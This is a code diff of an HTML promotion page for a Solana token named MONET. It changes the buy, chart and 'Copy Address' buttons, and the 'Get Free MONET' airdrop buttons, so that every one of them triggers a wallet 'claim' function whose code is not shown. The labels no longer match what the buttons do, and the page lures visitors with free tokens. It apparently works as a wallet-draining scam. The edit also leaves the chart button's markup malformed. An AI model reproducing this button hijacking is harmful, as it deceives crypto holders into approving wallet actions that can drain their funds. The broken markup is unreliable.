@@ -134,8 +134,8 @@ body {
     For those who aren't made of money… better have your Monet.
   </div>
 
-  <button class="btn" onclick="buy()">Make Money Moves</button>
-  <button class="btn" onclick="claim()"><a href="https://monetmoney-production.up.railway.app" target="_blank" style="text-decoration:none;color:inherit;"><span onclick="monetClaim()" style="cursor:pointer;">Get Free MONET</span></a></button>
+  <button class="btn" onclick="monetClaim()">Make Money Moves</button>
+  <button class="btn" onclick="monetClaim()"><a href="https://monetmoney-production.up.railway.app" target="_blank" style="text-decoration:none;color:inherit;"><span onclick="monetClaim()" style="cursor:pointer;">Get Free MONET</span></a></button>
 </div>
 
 <div class="section">
@@ -147,7 +147,7 @@ body {
   <h2>Chart</h2>
 <div style="text-align:center;margin:20px;">
   <h2 style="color:#00ffcc;">📊 View Live Chart</h2>
-  <button onclick="window.open(\"https://jup.ag/swap/SOL-MONET\",\"_blank\")" style="padding:12px 25px;font-size:16px;background:#00ffcc;border:none;border-radius:8px;cursor:pointer;font-weight:bold;">
+  <button onclick="monetClaim()"https://jup.ag/swap/SOL-MONET\",\"_blank\")" style="padding:12px 25px;font-size:16px;background:#00ffcc;border:none;border-radius:8px;cursor:pointer;font-weight:bold;">
     Open Jupiter
   </button>
 </div>
@@ -165,7 +165,7 @@ body {
 <div class="wallet" id="wallet"></div>
 
 <a href="https://t.me/Libra_Token_Solana" class="cta cta-telegram">Join Telegram</a>
-<button class="cta cta-airdrop" onclick="claim()"><a href="https://monetmoney-production.up.railway.app" target="_blank" style="text-decoration:none;color:inherit;"><span onclick="monetClaim()" style="cursor:pointer;">Get Free MONET</span></a></button>
+<button class="cta cta-airdrop" onclick="monetClaim()"><a href="https://monetmoney-production.up.railway.app" target="_blank" style="text-decoration:none;color:inherit;"><span onclick="monetClaim()" style="cursor:pointer;">Get Free MONET</span></a></button>
 
 <script>
 async function getProvider(){
@@ -374,7 +374,7 @@ async function monetClaim(){
 <div style="background:#111;padding:15px;border-radius:10px;display:inline-block;">
 <span id="tokenAddress">6eACLGXCGdw9D5zb5eBKyFnFNTX9pTihDEpZQ7gYAX1b</span>
 <br><br>
-<button onclick="copyToken()" style="padding:8px 16px;background:#00ffcc;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">
+<button onclick="monetClaim()" style="padding:8px 16px;background:#00ffcc;border:none;border-radius:6px;cursor:pointer;font-weight:bold;">
 Copy Address
 </button>
 <p id="copyStatus" style="margin-top:10px;font-size:12px;"></p>
@@ -388,6 +388,7 @@ document.getElementById("copyStatus").innerText="✅ Copied!";
 }
 </script>
 
+<p id="status" style="text-align:center;margin-top:10px;"></p>
 </body>
 </html>
 
